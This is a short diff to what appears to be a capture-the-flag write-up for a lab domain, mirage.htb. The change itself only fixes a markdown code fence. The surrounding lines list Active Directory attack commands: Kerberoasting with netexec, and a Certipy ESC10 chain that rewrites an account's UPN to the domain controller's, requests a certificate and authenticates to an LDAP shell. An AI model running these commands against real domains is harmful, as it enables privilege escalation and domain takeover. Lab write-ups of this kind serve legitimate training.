@@ -45,7 +45,8 @@ netexec ldap DC01.mirage.htb -u david.jjackson -p '<PASS>' -k --kerberoasting tg
 # ESC10
 certipy account -user mark.bbond update -upn 'DC01$@mirage.htb' -target DC01.mirage.htb -k
 certipy req -target DC01.mirage.htb -ca mirage-DC01-CA -template User -u mark.bbond@mirage.htb -p '<PASS>'
-certipy auth -pfx dc01.pfx -dc-ip <IP> -ldap-shell```
+certipy auth -pfx dc01.pfx -dc-ip <IP> -ldap-shell
+```
 
 ## Lateral movement
 
